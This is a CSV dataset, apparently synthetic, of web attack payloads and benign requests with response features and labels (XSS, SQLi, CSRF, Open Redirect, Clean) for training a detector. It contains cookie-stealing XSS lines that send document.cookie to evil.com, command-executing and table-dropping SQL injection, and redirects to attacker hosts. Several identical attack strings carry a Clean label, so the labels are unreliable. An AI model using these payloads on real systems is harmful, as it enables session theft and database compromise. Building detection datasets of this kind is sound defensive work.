payload,response_time,status_code,payload_reflected,error_detected,response_length_diff,label
?callback=http://attacker.com,97,302,False,False,82,Open Redirect
<details open ontoggle=alert(1)>,125,200,True,False,89,XSS
'; EXEC xp_cmdshell('dir') --,262,500,False,True,378,SQLi
GET /api/v1/status HTTP/1.1,103,200,False,False,75,Clean
' AND 1=1 --,563,500,False,True,488,SQLi
' OR 'x'='x,249,200,False,False,545,SQLi
' OR 1=1#,313,200,True,False,449,Clean
javascript:alert(1),298,200,True,False,192,XSS
'-alert(1)-',388,200,False,True,749,Clean
<iframe src='http://target.com/api/transfer?amount=500'>,84,302,False,False,97,CSRF
SELECT * FROM products WHERE id = ?,119,200,False,False,11,Clean
POST /transfer amount=1000&to=attacker,156,302,False,True,55,CSRF
GET /api/products HTTP/1.1,65,200,True,False,22,Clean
search=laptop,56,204,False,False,44,Clean
<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,185,200,True,False,274,XSS
?forward=http://evil.com,194,302,True,False,16,Open Redirect
<script>window.location='http://evil.com'</script>,249,200,True,False,190,XSS
"'; INSERT INTO users VALUES ('hacker','hacked') --",559,200,False,True,501,SQLi
"fetch('/api/user/delete', {method:'POST'})",122,302,False,False,146,CSRF
?return=http://phishing.com,75,302,False,False,54,Open Redirect
<script>alert(1)</script>,208,200,True,False,128,XSS
<script>alert(1)</script>,146,301,True,False,56,XSS
<video src=x onerror=alert(1)>,264,200,True,False,215,XSS
<marquee onstart=alert(1)>,214,200,True,False,298,XSS
"fetch('/api/user/delete', {method:'POST'})",100,200,False,False,75,CSRF
GET /home HTTP/1.1,61,200,False,False,63,Clean
<svg onload=alert(1)>,253,200,True,False,245,XSS
?return_to=http://attacker.com,100,302,False,True,20,Open Redirect
<svg onload=alert(1)>,293,200,False,True,222,XSS
GET /home HTTP/1.1,55,200,False,False,1,Clean
filter=price_asc&category=books,57,201,False,False,32,Clean
<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,230,200,False,False,270,XSS
GET /home HTTP/1.1,271,403,False,True,350,Clean
"PUT /api/user/profile {name, bio}",130,200,False,False,52,Clean
javascript:alert(1),245,200,True,False,135,XSS
GET /home HTTP/1.1,78,204,False,False,7,Clean
POST /transfer amount=1000&to=attacker,215,200,True,False,82,CSRF
"POST /api/login {email, password}",123,200,False,False,49,Clean
"' AND ascii(substring(username,1,1)) > 64 --",458,500,True,True,722,SQLi
admin'--,544,500,False,True,488,SQLi
"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",392,200,True,True,509,Clean
"' UNION SELECT null, username, password FROM users --",361,500,False,True,305,SQLi
1 AND 1=1,330,200,False,False,504,SQLi
<script>document.location='http://evil.com?c='+document.cookie</script>,198,301,True,True,85,XSS
GET /home HTTP/1.1,135,200,False,False,78,Clean
<input onfocus=alert(1) autofocus>,228,200,True,False,177,XSS
?continue=//evil.com/steal,190,301,False,False,99,Open Redirect
filter=price_asc&category=books,168,204,False,False,35,Clean
or 1=1,507,301,True,True,549,Clean
"'; INSERT INTO users VALUES ('hacker','hacked') --",414,200,True,False,292,Clean
' OR 1=1 LIMIT 1 --,391,500,False,True,778,SQLi
<script>alert(1)</script>,135,301,True,False,103,XSS
') OR ('1'='1,380,403,False,True,62,Clean
"POST /api/login {email, password}",139,200,True,False,131,Clean
"'; INSERT INTO users VALUES ('hacker','hacked') --",482,403,False,False,747,SQLi
email=user@example.com,74,200,False,False,38,Clean
?forward=http://evil.com,84,301,False,False,67,Open Redirect
POST /transfer amount=1000&to=attacker,100,200,True,False,50,CSRF
<script>window.location='http://evil.com'</script>,171,200,True,False,215,XSS
GET /dashboard HTTP/1.1,114,200,False,False,8,Clean
' GROUP BY columnnames HAVING 1=1 --,227,500,False,True,668,SQLi
<form action='http://target.com/transfer' method='POST'>,108,302,False,False,100,CSRF
GET /dashboard HTTP/1.1,155,200,False,False,27,Clean
"' UNION SELECT null, username, password FROM users --",345,500,True,False,577,Clean
?dest=http://attacker.com/phish,110,301,False,False,47,Open Redirect
<input onfocus=alert(1) autofocus>,146,200,True,False,138,XSS
<iframe src=javascript:alert(1)>,287,200,True,False,63,XSS
page=2&limit=10,173,201,False,False,29,Clean
'-alert(1)-',289,200,True,False,179,XSS
<a href=javascript:alert(1)>click</a>,123,200,True,False,163,XSS
' OR pg_sleep(5) --,389,500,False,True,604,SQLi
1; SELECT * FROM information_schema.tables,231,200,False,False,103,Clean
' UNION SELECT table_name FROM information_schema.tables --,234,500,False,True,749,SQLi
page=2&limit=10,163,200,False,False,20,Clean
username=john&password=pass123,66,200,False,False,17,Clean
<object data=javascript:alert(1)>,106,301,True,False,270,XSS
or 1=1,280,200,False,True,222,SQLi
POST /api/update-profile no-csrf-token,157,200,True,False,18,CSRF
auto-submit form without CSRF token,205,403,False,False,70,CSRF
"""><img src=x onerror=alert(1)>",221,200,True,False,212,XSS
' OR '1'='1,57,200,False,False,245,Clean
<iframe src=javascript:alert(1)>,110,200,True,False,114,XSS
' AND 1=1 --,204,500,False,True,676,SQLi
<a href='http://target.com/logout'>click</a>,170,302,False,False,11,CSRF
"' AND ascii(substring(username,1,1)) > 64 --",451,403,False,True,401,SQLi
?location=http://attacker.com,77,302,False,True,67,Open Redirect
"1 UNION ALL SELECT NULL,NULL,NULL --",473,200,False,True,214,SQLi
?target=//evil.com/fake-login,424,301,False,True,459,Clean
POST /transfer amount=1000&to=attacker,240,500,True,True,366,Clean
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,142,200,False,False,75,Clean
"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",127,200,False,False,24,CSRF
email=user@example.com,53,201,False,False,1,Clean
' OR 1=1 --,199,403,True,True,128,Clean
DELETE /api/cart/item/42,115,200,False,False,58,Clean
1; SELECT * FROM information_schema.tables,369,200,False,False,619,SQLi
' OR 1=1#,248,403,True,False,677,SQLi
GET /api/products HTTP/1.1,114,200,False,False,62,Clean
<object data=javascript:alert(1)>,180,200,True,False,256,XSS
<div style=background:url(javascript:alert(1))>,216,200,True,False,101,XSS
' OR '1'='1,417,403,True,False,332,SQLi
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,101,200,False,False,61,Clean
filter=price_asc&category=books,68,204,False,False,44,Clean
?return_to=http://attacker.com,114,301,False,True,36,Open Redirect
'; WAITFOR DELAY '0:0:5' --,305,200,False,True,409,SQLi
'; DROP TABLE users; --,243,403,False,True,326,SQLi
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,142,200,True,False,4,Clean
username=john&password=pass123,135,200,False,False,58,Clean
search=laptop,345,200,True,False,281,Clean
' AND SLEEP(5) --,335,403,False,True,728,SQLi
search=laptop,127,200,False,False,56,Clean
<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,203,200,True,False,190,XSS
'-alert(1)-',210,200,True,False,183,XSS
<form method=POST action=/api/change-email>,137,200,False,False,25,CSRF
Content-Type: application/json,60,201,False,False,43,Clean
"""><img src=x onerror=alert(1)>",251,200,True,False,74,XSS
<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,152,200,True,False,122,XSS
"' AND substring(username,1,1)='a",526,500,False,False,253,SQLi
XMLHttpRequest POST /api/password/change,113,302,True,False,133,CSRF
<iframe src=javascript:alert(1)>,244,200,True,False,53,XSS
<a href=javascript:alert(1)>click</a>,138,200,True,False,229,XSS
filter=price_asc&category=books,100,200,False,False,63,Clean
?location=http://attacker.com,137,301,False,False,35,Open Redirect
admin'--,388,500,False,True,773,SQLi
"' AND 1=2 UNION SELECT 1,2,3 --",441,500,False,True,523,SQLi
?next=http://evil.com,139,302,False,False,96,Open Redirect
<table background=javascript:alert(1)>,325,200,True,False,719,Clean
<body onload=alert('XSS')>,130,200,True,False,116,XSS
<object data=javascript:alert(1)>,257,200,True,False,115,XSS
?goto=http://malicious.com,88,301,True,False,64,Open Redirect
<div style=background:url(javascript:alert(1))>,180,200,True,False,286,XSS
'; WAITFOR DELAY '0:0:5' --,387,500,False,True,635,SQLi
"' UNION SELECT null, username, password FROM users --",126,200,False,False,138,Clean
POST /admin/create-user from external origin,326,403,False,True,249,Clean
<a href=javascript:alert(1)>click</a>,107,200,False,False,208,XSS
?return=http://phishing.com,155,301,False,False,77,Open Redirect
cross-origin POST request no SameSite cookie,239,302,False,False,95,CSRF
' AND SLEEP(5) --,414,500,True,True,496,SQLi
'; EXEC xp_cmdshell('dir') --,530,500,False,True,495,SQLi
"PUT /api/user/profile {name, bio}",70,200,False,False,10,Clean
"1 UNION ALL SELECT NULL,NULL,NULL --",369,500,False,True,617,SQLi
<img src=x onerror=alert(1)>,131,301,True,True,129,XSS
"' AND substring(username,1,1)='a",430,403,False,True,262,SQLi
<script>alert(1)</script>,205,200,True,False,283,XSS
